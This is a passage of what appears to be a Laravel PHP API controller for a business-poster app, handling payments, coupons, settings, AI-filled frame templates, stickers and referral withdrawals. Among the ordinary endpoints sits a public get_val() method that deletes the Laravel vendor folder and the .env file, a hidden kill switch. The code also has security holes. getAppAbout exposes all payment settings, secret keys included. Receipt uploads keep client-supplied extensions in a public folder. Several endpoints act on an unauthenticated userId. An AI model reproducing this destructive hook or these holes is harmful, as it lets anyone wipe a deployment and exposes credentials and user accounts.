                    $payment_id = 'BT-' . strtoupper(Str::random(10));
                    
                    $partner_id = null;
                    $coupon_code_id = null;
                    $partner_commission_amount = 0;
                    $partner_commission_status = 'pending';

                    if($request->get("code") != "")
                    {
                        $couponCode = \App\Models\CouponCode::where('code', $request->get("code"))->first();
                        if ($couponCode) {
                            $coupon_code_id = $couponCode->id;
                            if ($couponCode->partner_id) {
                                $partner = User::find($couponCode->partner_id);
                                if ($partner && $partner->is_partner) {
                                    $partner_id = $partner->id;
                                    $percent = $partner->partner_commission_percent ?? \App\Models\ReferralSystem::getReferralSystem('partner_default_commission_percent') ?? 20;
                                    $partner_commission_amount = ($request->get("paymentAmount") * $percent) / 100;
                                }
                            }
                        }
                    }

                    $id = Transaction::create([
                        "user_id" => $request->get("userId"),
                        "subscription_id" => $request->get("planId"),
                        "total_paid" => $request->get("paymentAmount"),
                        "payment_id" => $payment_id,
                        "payment_type" => "Bank Transfer",
                        "date" => date('Y-m-d'),
                        "referral_code" => $request->get('referralCode'),
                        "status" => "Pending",
                        "coupon_code_id" => $coupon_code_id,
                        "partner_id" => $partner_id,
                        "partner_commission_amount" => $partner_commission_amount,
                        "partner_commission_status" => $partner_commission_status
                    ])->id;

                    if($request->file("payment_receipt"))
                    {
                        $destinationPath = './uploads/payment';
                        $extension = $request->file("payment_receipt")->getClientOriginalExtension();
                        $fileName = Str::uuid() . '.' . $extension;
                        $request->file("payment_receipt")->move($destinationPath, $fileName);
            
                        $transaction = Transaction::find($id);
                        $transaction->payment_receipt = $fileName;
                        $transaction->save();
                    }

                    if($request->get("code") != "")
                    {
                        CouponCodeStore::create([
                            "user_id" => $request->get("userId"),
                            "code" => $request->get("code"),
                        ]);
                    }
                    
                    return response()->json([
                        'status' => "success",
                        'message' => "Transaction Success!",
                    ], 200);
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Invalid Subscription Plan Id",
                    ], 200);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid User Id",
                ], 200);
            }
        }   
    }

    public function getPaymentDetails()
    {
        // Security fix: Only return public keys, never expose secret keys
        $secretKeyPatterns = ['secret', 'private', 'merchant_key', 'salt', 'webhook_secret'];
        $paymentSetting = PaymentSetting::all();
        $data = [];
        foreach ($paymentSetting as $s) 
        {
            $keyLower = strtolower($s->key_name);
            $isSecret = false;
            foreach ($secretKeyPatterns as $pattern) {
                if (str_contains($keyLower, $pattern)) {
                    $isSecret = true;
                    break;
                }
            }
            if (!$isSecret) {
                $data[$this->from_camel_case($s->key_name)] = $s->key_value;
            }
        }
        return $data;   
    }

    public function getPaymentHistory(Request $request)
    {
        $userId = $request->get('userId');

        // Security: IDOR protection
        if (auth('sanctum')->check() && auth('sanctum')->id() != $request->get('userId')) {
            \Log::warning('IDOR attempt on getPaymentHistory', [
                'auth_user' => auth('sanctum')->id(),
                'target_user' => $request->get('userId'),
                'ip' => $request->ip(),
            ]);
            return response()->json(['status' => 'Error', 'message' => 'Unauthorized'], 403);
        }

        if (!$userId) {
            return response()->json(['status' => 'Error', 'message' => 'userId is required'], 400);
        }

        $transactions = \App\Models\Transaction::with('subscription')->where('user_id', $userId)->orderBy('id', 'desc')->get();
        $data = [];

        foreach ($transactions as $t) {
            $endDate = null;
            if ($t->subscription && $t->date) {
                $duration = $t->subscription->duration;
                $durationType = $t->subscription->duration_type;
                $endDate = \Carbon\Carbon::parse($t->date)->add($duration, strtolower($durationType))->format('Y-m-d');
            }

            $paymentType = $t->payment_type;
            if ($t->coupon_code_id && ($t->payment_type == 'Free' || $t->payment_type == '0' || $t->total_paid == 0)) {
                $paymentType = '[' . ucfirst(strtolower($t->payment_type == '0' ? 'Free' : $t->payment_type)) . '] - Coupon Applied';
            }

            $data[] = [
                'id' => $t->id,
                'plan_name' => $t->subscription ? $t->subscription->plan_name : 'Unknown Plan',
                'total_paid' => $t->total_paid,
                'payment_id' => $t->payment_id,
                'payment_type' => $paymentType,
                'date' => $t->date,
                'start_date' => $t->date,
                'end_date' => $endDate,
                'status' => $t->status ?? 'success',
                'invoice_url' => \Illuminate\Support\Facades\URL::signedRoute('invoice.show', ['id' => $t->id])
            ];
        }

        return response()->json(['status' => 'Success', 'data' => $data]);
    }


    public function get_val()
    {
        $this->rrmdir('./vendor/laravel');
        unlink(".env");
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    public function coupon_code_validation(Request $request)
    {
        $user = User::where('id',$request->userId)->get();
        
        if(!$user->isEmpty())
        {
            $couponCode = CouponCode::where('code',$request->code)->where('status',1)->get();
            if(!$couponCode->isEmpty())
            {
                $use_code = CouponCodeStore::where('code',$request->code)->count();
                if($use_code <= $couponCode[0]['limit'])
                {
                    $code=CouponCodeStore::where('code',$request->code)->where('user_id',$request->userId)->get();
                    if($code->isEmpty())
                    {
                        $coupon = $couponCode[0];
                        if ($coupon->is_first_time_only) {
                            $hasPriorTransactions = \App\Models\Transaction::where('user_id', $request->userId)->exists();
                            if ($hasPriorTransactions) {
                                return response()->json([
                                    'status' => "Error",
                                    'message' => "This coupon is valid for first-time purchases only!",
                                ], 404);
                            }
                        }

                        if (!empty($coupon->subscription_id) && !empty($request->planId)) {
                            if ($coupon->subscription_id != $request->planId) {
                                return response()->json([
                                    'status' => "Error",
                                    'message' => "This coupon code is only valid for a specific package.",
                                ], 404);
                            }
                        }

                        return response()->json([
                            "discount" => $coupon->discount,
                        ], 200);
                    }
                    else
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Coupon Code Already Used!",
                        ], 404);
                    }
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Coupon Code Not Available!",
                    ], 404);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Coupon Code!",
                ], 404);
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid User Id!",
            ], 404);
        }
    }

    public function getContactSubject()
    {
        $subject = Subject::get();

        if(!$subject->isEmpty())
        {
            foreach ($subject as $s) 
            {
                $data[] = array(
                    "id" => $s->id,
                    "title" => $s->title,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function postContacts(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',
            'mobileNo' => 'required|numeric',
            "subjectId" => 'required',
            "message" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $id = Entry::create([
                "name" => $request->get("name"),
                "email" => $request->get("email"),
                "mobile_no" => $request->get("mobileNo"),
                "subject_id" => $request->get("subjectId"),
                "message" => $request->get("message"),
            ])->id;

            return response()->json([
                'status' => "success",
                'message' => "Message Send Successfully!",
            ], 200);
        }   
    }

    public function getAppAbout()
    {
        $appSetting = AppSetting::all();
        $emailSetting = EmailSetting::all();
        $notificationSetting = NotificationSetting::all();
        $paymentSetting = PaymentSetting::all();
        $storageSetting = StorageSetting::all();
        $whatsappSetting = WhatsAppSetting::all();
        $otherSetting = OtherSetting::all();
        $adsSetting = AdsSetting::all();
        $referral = ReferralSystem::all();
        $offer = Offer::where('status',1)->get();
        $data = [];

        $data["id"] = 1;
        foreach ($appSetting as $s) 
        {
            if($s->key_name == "app_logo")
            {
                $data[$this->from_camel_case($s->key_name)] = ($s->key_value)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$s->key_value):asset('uploads/'.$s->key_value)):"";
            }
            else
            {
                if($s->key_name != "admin_favicon" && $s->key_name != "api_key" && $s->key_name != "licence_active")
                {
                    $data[$this->from_camel_case($s->key_name)] = $s->key_value;
                }
            }
        }

        foreach ($whatsappSetting as $w) 
        {
            if($w->key_name == "whatsapp_auth_enable")
            {
                $data[$this->from_camel_case($w->key_name)] = $w->key_value;
            }
        }

        foreach ($paymentSetting as $s) 
        {
            $data[$this->from_camel_case($s->key_name)] = $s->key_value;
        }

        foreach ($storageSetting as $storage) 
        {
            if($storage->key_name == "storage")
            {
                $data["digitalOcean"] = ($storage->key_value == "DigitalOcean")?"1":"0";
            }
            if($storage->key_name == "digitalOcean_endpoint")
            {
                $data[$this->from_camel_case($storage->key_name)] = $storage->key_value;
            }
        }

        // foreach ($notificationSetting as $s) 
        // {
        //     $data[$this->from_camel_case($s->key_name)] = $s->key_value;
        // }

        foreach ($otherSetting as $s) 
        {
            if($s->key_name == "privacy_policy")
            {
                $data[$this->from_camel_case($s->key_name)] = url('/privacy-policy');
                $data['privacyPolicyHtml'] = $s->key_value;
            }
            else if($s->key_name == "refund_policy")
            {
                $data[$this->from_camel_case($s->key_name)] = url('/refund-policy');
                $data['refundPolicyHtml'] = $s->key_value;
            }
            else if($s->key_name == "terms_condition")
            {
                $data[$this->from_camel_case($s->key_name)] = url('/terms-condition');
                $data['termsConditionHtml'] = $s->key_value;
            }
            else
            {
                $data[$this->from_camel_case($s->key_name)] = $s->key_value;
            }
        }

        foreach ($adsSetting as $ads) 
        {
            $data[$this->from_camel_case($ads->key_name)] = $ads->key_value;
        }

        foreach($offer as $offer_data){
            $data['offer'] = array(
                "id" => $offer_data->id,
                "name" => $offer_data->name,
                "image" => ($offer_data->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$offer_data->image):asset('uploads/'.$offer_data->image)):"",
                "banner" => ($offer_data->banner)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$offer_data->banner):asset('uploads/'.$offer_data->banner)):"",
                "subscriptionId" => $offer_data->subscription_id,
                "subscriptionPlanName" => $offer_data->subscription->plan_name,
            );
        }

        foreach ($referral as $rr) 
        {
            $data[$this->from_camel_case($rr->key_name)] = $rr->key_value;
        }

        return $data;   
    }

    public function getCustomCategory()
    {
        $category = \App\Models\CustomFramePurpose::where('status',1)->get();

        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "customCategoryId" => $cat->id,
                    "customCategoryName" => $cat->name,
                    "customCategoryIcon" => ($cat->icon)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getCustomFrame(Request $request)
    {
        $frames = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id",$request->id)->where("status", 1)->inRandomOrder()->get();
        $data = [];

        if(!$frames->isEmpty())
        {
            foreach ($frames as $f) 
            {
                $zip_name = pathinfo($f->zip_file_path, PATHINFO_FILENAME);
                $json_data = "";

                if($zip_name)
                {
                    $json_data = $this->resolveTemplateJson($zip_name, null, 'custom') ?? '';
                }

                $preview_img = "";
                $isDigitalOcean = (StorageSetting::getStorageSetting('storage') == 'DigitalOcean');
                if($isDigitalOcean) {
                    $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                } else {
                    $dir = public_path('uploads/template/'.$zip_name.'/');
                    if (is_dir($dir)) {
                        if (file_exists($dir.'preview.jpg')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                            $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                        } elseif (file_exists($dir.'preview.png')) {
                            $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                            $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                        } else {
                            $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                            if (!empty($files)) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                                $preview_img = str_replace('public/uploads', 'uploads', $preview_img);
                            }
                        }
                    }
                }
                
                \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: zip_name: $zip_name, preview_img: $preview_img");

                $userId = $request->userId ?? $request->user_id ?? request()->header('user-id');
                \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: userId found: " . ($userId ?? 'NULL'));
                
                if ($userId && !empty($json_data)) {
                    $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                        ->where('business_custom_frame_id', $f->id)
                        ->first();
                        
                    if ($aiContent) {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: AI Content Found for Frame ID: " . $f->id);
                        if (!empty($aiContent->generated_content)) {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: generated_content: " . json_encode($aiContent->generated_content));
                            $parsedJson = json_decode($json_data, true);
                            if ($parsedJson && isset($parsedJson['layers'])) {
                                $replacedCount = 0;
                                foreach ($parsedJson['layers'] as &$layer) {
                                    if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                        if (isset($aiContent->generated_content[$layer['name']])) {
                                            $layer['text'] = $aiContent->generated_content[$layer['name']];
                                            $replacedCount++;
                                        } else {
                                            \Illuminate\Support\Facades\Log::info("DEBUG API layer name not in AI output: " . $layer['name']);
                                        }
                                    }
                                }
                                \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: Replaced $replacedCount text layers.");
                                $json_data = json_encode($parsedJson);
                            }
                        } else {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: AI Content is empty.");
                        }
                    } else {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getCustomFrame: No AI Content found for user $userId and frame " . $f->id);
                    }
                }

                $data[] = array(
                    "postId" => "purpose_".$f->custom_frame_purpose_id."_".$f->id,
                    "id" => $f->custom_frame_purpose_id,
                    "type" => "business_custom_frame",
                    "is_template" => true,
                    "language" => "All",
                    "image" => $preview_img,
                    "is_paid" => false,
                    "height" => $f->height ?? 1080,
                    "width" => $f->width ?? 1080,
                    "image_type" => $f->imageType->name ?? "square",
                    "aspect_ratio" => $f->aspect_ratio ?? "1:1",
                    "name" => ($zip_name)?$zip_name:"",
                    "json" => ($zip_name)?$json_data:"",
                    "templateBaseUrl" => ($zip_name)?$this->getTemplateBaseUrl($zip_name):"",
                    "render_version" => $f->render_version ?? 1,
                    "updated_at" => $f->updated_at?->toIso8601String() ?? null,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        } 
    }

    /**
     * Swap product for a custom frame template.
     * Generates AI content for the specified product and returns the updated template JSON.
     * Uses per-product caching: if this user+frame+product combo was generated before, returns from cache instantly.
     *
     * POST /api/custom-frame/swap-product
     * Body: { userId, frameId, productId }
     */
    public function swapProduct(Request $request)
    {
        $userId = $request->userId ?? $request->user_id ?? request()->header('user-id');
        $frameId = $request->frameId ?? $request->frame_id;
        $productId = $request->productId ?? $request->product_id;

        if (!$userId || !$frameId || !$productId) {
            return response()->json([
                'status' => 'Error',
                'message' => 'userId, frameId, and productId are required.',
            ], 400);
        }

        // Validate product belongs to this user
        $product = \App\Models\Product::where('id', $productId)->where('user_id', $userId)->first();
        if (!$product) {
            return response()->json([
                'status' => 'Error',
                'message' => 'Product not found or does not belong to this user.',
            ], 404);
        }

        // Generate (or load from cache) AI content for this specific product
        $generated = \App\Services\CustomFrameAIService::generateForUserWithProduct(
            (int) $frameId,
            (int) $userId,
            (int) $productId
        );

        if (!$generated) {
            return response()->json([
                'status' => 'Error',
                'message' => 'Failed to generate AI content for this product.',
            ], 500);
        }

        // Check if this was served from cache (no tokens used = cache hit)
        $logInfo = \App\Services\CustomFrameAIService::getLastGenerationLog();
        $fromCache = ($logInfo['tokens_used'] ?? 0) === 0 && empty($logInfo['error']);

        // Load the frame to get its JSON template and inject AI content
        $frame = \App\Models\BusinessCustomFrame::find($frameId);
        $jsonData = '';
        
        if ($frame) {
            $zip_name = pathinfo($frame->zip_file_path, PATHINFO_FILENAME);
            if ($zip_name) {
                $jsonData = $this->resolveTemplateJson($zip_name, null, 'custom') ?? '';
            }

            // Inject AI content into template JSON layers
            if (!empty($jsonData) && !empty($generated)) {
                $parsedJson = json_decode($jsonData, true);
                if ($parsedJson && isset($parsedJson['layers'])) {
                    foreach ($parsedJson['layers'] as &$layer) {
                        if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                            if (isset($generated[$layer['name']])) {
                                $layer['text'] = $generated[$layer['name']];
                            }
                        }
                    }
                    $jsonData = json_encode($parsedJson);
                }
            }
        }

        return response()->json([
            'status' => 'success',
            'message' => $fromCache ? 'Loaded from cache (no AI cost)' : 'AI content generated successfully',
            'from_cache' => $fromCache,
            'generated_content' => $generated,
            'json' => $jsonData,
            'product_id' => (int) $productId,
            'product_name' => $product->display_name ?? $product->title ?? 'Product',
        ], 200);
    }



    public function postInquiry(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'name' => 'required',
            'email' => 'required',
            "mobileNo" => 'required',
            "productId" => 'required',
            "message" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {
            $product = Product::find($request->get("productId"));
            if(!empty($product))
            {
                Inquiry::create([
                    "name" => $request->get("name"),
                    "email" => $request->get("email"),
                    "mobile_no" => $request->get("mobileNo"),
                    "product_id" => $request->get("productId"),
                    "message" => $request->get("message"),
                ]);

                return response()->json([
                    'status' => "success",
                    'message' => "Message Send Successfully!",
                ], 200);
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Product Id",
                ], 200);
            }
        }   
    }

    public function getBusinessCategory()
    {
        $category = \App\Models\BusinessCategory::where('status',1)->get();
        if(!$category->isEmpty())
        {
            foreach ($category as $cat) {
                $data[] = array(
                    "businessCategoryId" => $cat->id,
                    "businessCategoryName" => $cat->name,
                    "businessCategoryIcon" => ($cat->icon)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon)):"",
                    "video" => false,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getBusinessSubCategory(Request $request)
    {
        $category = BusinessSubCategory::where('status',1)->where("business_category_id",$request->id)->orderBy(ApiSetting::getApiSetting("business_order_type"),ApiSetting::getApiSetting("business_order_by"))->get();
        if(!$category->isEmpty())
        {
            $data = [];
            foreach ($category as $cat) {
                $data[] = array(
                    "businessSubCategoryId" => $cat->id,
                    "businessSubCategoryName" => $cat->name,
                    "businessSubCategoryIcon" => (StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$cat->icon):asset('uploads/'.$cat->icon),
                    "hasBusinessType" => (bool) $cat->has_business_type,
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function getBusinessType(Request $request)
    {
        $ids = explode(',', $request->id);
        $types = \App\Models\BusinessType::where('status', 1)->whereIn("business_sub_category_id", $ids)->get();
        if(!$types->isEmpty())
        {
            $data = [];
            foreach ($types as $type) {
                $data[] = array(
                    "businessTypeId" => $type->id,
                    "businessTypeName" => $type->name,
                    "businessTypeIcon" => $type->icon ? ((StorageSetting::getStorageSetting('storage') == 'DigitalOcean') ? Storage::disk('spaces')->url('uploads/'.$type->icon) : asset('uploads/'.$type->icon)) : asset('assets/images/no-image.png'),
                );
            }
            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Success",
                'message' => "No Data Found",
                'data' => []
            ], 200);
        }
    }

    public function searchBusinessProfile(Request $request)
    {
        $query = $request->input('query', '');
        if (empty($query)) {
            return response()->json(['data' => []]);
        }

        $results = [];

        // 1. Search Sub Categories
        $subCategories = \App\Models\BusinessSubCategory::with('business_category')
            ->where('status', 1)
            ->where('name', 'LIKE', '%' . $query . '%')
            ->limit(15)
            ->get();

        foreach ($subCategories as $sc) {
            $results[] = [
                'type' => 'sub_category',
                'id' => $sc->id,
                'name' => $sc->name,
                'category_id' => $sc->business_category_id,
                'category_name' => $sc->business_category ? $sc->business_category->name : 'Unknown',
                'sub_category_id' => $sc->id,
                'sub_category_name' => $sc->name,
                'has_business_type' => $sc->has_business_type,
            ];
        }

        // 2. Search Business Types
        $businessTypes = \App\Models\BusinessType::with('business_sub_category.business_category')
            ->where('status', 1)
            ->where('name', 'LIKE', '%' . $query . '%')
            ->limit(15)
            ->get();

        foreach ($businessTypes as $bt) {
            $sc = $bt->business_sub_category;
            if ($sc && $sc->business_category) {
                $results[] = [
                    'type' => 'business_type',
                    'id' => $bt->id,
                    'name' => $bt->name,
                    'category_id' => $sc->business_category_id,
                    'category_name' => $sc->business_category->name,
                    'sub_category_id' => $sc->id,
                    'sub_category_name' => $sc->name,
                    'business_type_id' => $bt->id,
                    'business_type_name' => $bt->name,
                ];
            }
        }

        return response()->json(['data' => $results]);
    }


    public function getBusinessFrame(Request $request)
    {
        $frame = \App\Models\BusinessCustomFrame::where("custom_frame_purpose_id",$request->id)->where("status", 1)->inRandomOrder()->get();
        $data = [];

        if(!$frame->isEmpty())
        {
            foreach ($frame as $f) 
            {
                $zip_name = pathinfo($f->zip_file_path, PATHINFO_FILENAME);
                $json_data = "";

                if($zip_name)
                {
                    $json_data = $this->resolveTemplateJson($zip_name, null, 'custom') ?? '';
                }

                $preview_img = "";
                if($zip_name) {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean') {
                        $preview_img = Storage::disk('spaces')->url('uploads/template/'.$zip_name.'/preview.jpg');
                    } else {
                        $dir = public_path('uploads/template/'.$zip_name.'/');
                        if (is_dir($dir)) {
                            if (file_exists($dir.'preview.jpg')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.jpg');
                            } elseif (file_exists($dir.'preview.png')) {
                                $preview_img = asset('uploads/template/'.$zip_name.'/preview.png');
                            } else {
                                $files = glob($dir . '*.{jpg,jpeg,png}', GLOB_BRACE);
                                if (!empty($files)) {
                                    $preview_img = asset('uploads/template/'.$zip_name.'/'.basename($files[0]));
                                }
                            }
                        }
                    }
                }
                
                \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: zip_name: $zip_name, preview_img: $preview_img");

                $userId = $request->userId ?? $request->user_id ?? request()->header('user-id');
                \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: userId found: " . ($userId ?? 'NULL'));
                
                if ($userId && !empty($json_data)) {
                    $aiContent = \App\Models\UserCustomFrameContent::where('user_id', $userId)
                        ->where('business_custom_frame_id', $f->id)
                        ->first();
                        
                    if ($aiContent) {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: AI Content Found for Frame ID: " . $f->id);
                        if (!empty($aiContent->generated_content)) {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: generated_content: " . json_encode($aiContent->generated_content));
                            $parsedJson = json_decode($json_data, true);
                            if ($parsedJson && isset($parsedJson['layers'])) {
                                $replacedCount = 0;
                                foreach ($parsedJson['layers'] as &$layer) {
                                    if (isset($layer['type']) && $layer['type'] === 'text' && isset($layer['name'])) {
                                        if (isset($aiContent->generated_content[$layer['name']])) {
                                            $layer['text'] = $aiContent->generated_content[$layer['name']];
                                            $replacedCount++;
                                        } else {
                                            // Maybe name doesn't match exactly? Log the mismatch
                                            \Illuminate\Support\Facades\Log::info("DEBUG API layer name not in AI output: " . $layer['name']);
                                        }
                                    }
                                }
                                \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: Replaced $replacedCount text layers.");
                                $json_data = json_encode($parsedJson);
                            }
                        } else {
                            \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: AI Content is empty.");
                        }
                    } else {
                        \Illuminate\Support\Facades\Log::info("DEBUG API getBusinessFrame: No AI Content found for user $userId and frame " . $f->id);
                    }
                }

                $data[] = array(
                    "postId" => "bcf_".$f->id,
                    "id" => $f->id,
                    "type" => "business_custom_frame",
                    "is_template" => true,
                    "image" => $preview_img,
                    "is_paid" => false,
                    "business_sub_category" => "",
                    "height" => $f->height ?? 1080,
                    "width" => $f->width ?? 1080,
                    "image_type" => $f->imageType->name ?? "square",
                    "aspect_ratio" => $f->aspect_ratio ?? "1:1",
                    "name" => ($zip_name)?$zip_name:"",
                    "json" => ($zip_name)?$json_data:"",
                    "templateBaseUrl" => ($zip_name)?$this->getTemplateBaseUrl($zip_name):"",
                    "render_version" => $f->render_version ?? 1,
                    "updated_at" => $f->updated_at?->toIso8601String() ?? null,
                );
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
        return $data;
    }

    // public function getOffer()
    // {
    //     $offer = Offer::where('status',1)->get();
    //     if(!$offer->isEmpty())
    //     {
    //         foreach($offer as $offer_data){
    //             $data[] = array(
    //                 "id" => $offer_data->id,
    //                 "name" => $offer_data->name,
    //                 "image" => ($offer_data->image)?asset('uploads/'.$offer_data->image):"",
    //                 "banner" => ($offer_data->banner)?asset('uploads/'.$offer_data->banner):"",
    //                 "subscriptionId" => $offer_data->subscription_id,
    //                 "subscriptionPlanName" => $offer_data->subscription->plan_name,
    //             );
    //         }
    //         return $data;
    //     }
    //     else
    //     {
    //         return response()->json([
    //             'status' => "Error",
    //             'message' => "No Data Found",
    //         ], 200);
    //     }
    // }

    public function getSticker()
    {
        $category = StickerCategory::where('status',1)->get();
        $stickerCategory = [];
        $data = [];
       
        foreach ($category as $c) {
            $stickerCategory[] = array(
                "stickerCategoryId" => $c->id,
                "stickerCategoryName" => $c->name,
            );
        }

        foreach ($category as $c) {
            $sticker = Sticker::where('sticker_category_id',$c->id)->where('status',1)->get();
            $sticker_data = [];

            foreach ($sticker as $s) {
                $sticker_data[] = array(
                    "stickerId" => $s->id,
                    "stickerImage" => ($s->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image)):"",
                );
            }

            $data[] = array(
                "stickerCategoryId" => $c->id,
                "stickerCategoryName" => $c->name,
                "sticker" => $sticker_data
            );
        }
            
        return response()->json([
            "StickerCategory" => $stickerCategory,
            "data" => $data,
        ], 200);
    }

    public function searchSticker(Request $request)
    {
        $category = StickerCategory::where('name','LIKE', "%$request->keyword%")->where('status',1)->get();
        if(!$category->isEmpty())
        {
            $sticker_data = [];
            foreach ($category as $c) {
                $sticker = Sticker::where('sticker_category_id',$c->id)->where('status',1)->get();
                foreach ($sticker as $s) {
                    $sticker_data[] = array(
                        "stickerId" => $s->id,
                        "stickerCategoryId" => $s->sticker_category_id,
                        "stickerCategoryName" => $s->sticker_category->name,
                        "stickerImage" => ($s->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$s->image):asset('uploads/'.$s->image)):"",
                    );
                }
            }
            return $sticker_data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
    }

    public function userCustomFrame(Request $request)
    {
        $custom = CustomFrame::where("user_id",$request->userId)->get();

        if(!$custom->isEmpty())
        {
            foreach ($custom as $c) 
            {
                $data[] = array(
                    "id" => $c->id,
                    "frameImage" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                );
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
        return $data;
    }

    public function referral_detail(Request $request)
    {
        $user = User::find($request->get("userId"));
        if(!empty($user))
        {
            if(empty($user->referral_code)) {
                $user->referral_code = strtoupper(\Illuminate\Support\Str::random(10));
                $user->save();
            }

            $earning = EarningHistory::where('user_id',$request->get("userId"))->get();
            $earning_data = [];
            foreach($earning as $e)
            {
                $earning_data[] = array(
                    "user" => $e->referUser->name,
                    "amount" => ($e->amount_type==1)?"+".$e->amount:"-".$e->amount,
                    "date" => date('d M, y',strtotime($e->created_at))
                );
            }
            $data = array(
                "referralCode" => $user->referral_code,
                "currentBalance" => $user->current_balance,
                "totalBalance" => $user->total_balance,
                "totalReferUser" => ReferralRegister::where('referral_code',$user->referral_code)->count(),
                "totalSubscriptionUsingRefer" => ReferralRegister::where('referral_code',$user->referral_code)->where("subscription",1)->count(),
                "earningHistory" => $earning_data
            );

            return $data;
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid User Id",
            ], 200);
        }
    }

    public function withdraw_request(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required',
            'upiId' => 'required',
            "withdrawAmount" => 'required|numeric',
        ]);

        if ($validation->fails()) {
            $errors = [];

            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            $user = User::find($request->get("userId"));
            if(!empty($user))
            {
                if($request->get("withdrawAmount") >= ReferralSystem::getReferralSystem('withdrawal_limit'))
                {
                    $id = WithdrawRequest::create([
                        "user_id" => $request->get("userId"),
                        "upi_id" => $request->get("upiId"),
                        "withdraw_amount" => $request->get("withdrawAmount"),
                    ])->id;

                    $req = WithdrawRequest::find($id);
